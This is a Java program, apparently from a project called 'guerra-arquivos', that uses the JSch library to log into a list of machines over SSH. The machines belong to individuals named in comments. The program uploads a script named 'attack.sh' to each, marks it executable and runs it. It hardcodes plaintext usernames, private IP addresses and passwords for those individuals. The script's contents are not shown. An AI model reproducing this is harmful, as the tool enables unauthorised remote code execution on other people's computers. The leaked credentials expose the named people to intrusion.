package connection;

import com.jcraft.jsch.*;

import java.util.*;

public class Main {

    private static final int PORT = 22;

    public static void main(String[] args) {
        List<UserLogin> userLogins = Arrays.asList(
//                new UserLogin("almaviva-linux", "192.168.208.90", "C4liforni4!", PORT), // Roberto
//                new UserLogin("almaviva-linux", "192.168.208.79", "renato@1234", PORT), // João
//                new UserLogin("matheus", "192.168.208.49", "magna@123", PORT), // Matheus
//                new UserLogin("almaviva-linux", "192.168.208.46", "Almaviva04092004", PORT), // Leonardo
//                new UserLogin("almaviva", "192.168.208.53", "magna@123", PORT), // Guilherme
//
//                new UserLogin("almaviva-linux", "192.168.208.79", "renato@1234", PORT), // Renato
//                new UserLogin("almaviva-linux", "192.168.208.73", "magna@123", PORT), // Gustavo
                new UserLogin("almaviva-linux", "192.168.208.101", "Magna@123", PORT) // Eric
//                new UserLogin("vitor", "192.168.208.95", "vito@123!", PORT) // Victor
        );

        userLogins.forEach(user -> {
            Session session = Connection.connectToUser(user);
            if (session != null) {
                String remoteDirectory = "/home/" + user.getUsername() + "/";
                Connection.sendFileToUser(session, "/opt/dev/projects/github-personal/almaviva-projetos/guerra-arquivos/src/main/resources/scripts/attack.sh", remoteDirectory);
                executeCommands(session, remoteDirectory);
                Connection.disconnectFromUser(session);
            }
        });
    }

    private static void executeCommands(Session session, String remoteDirectory) {
        String[] commands = {
                "chmod +x " + remoteDirectory + "attack.sh",
                "cd " + remoteDirectory + " && ./attack.sh"
        };

        for (String command : commands) {
            Connection.runCommandOnUser(session, command);
        }
    }
}
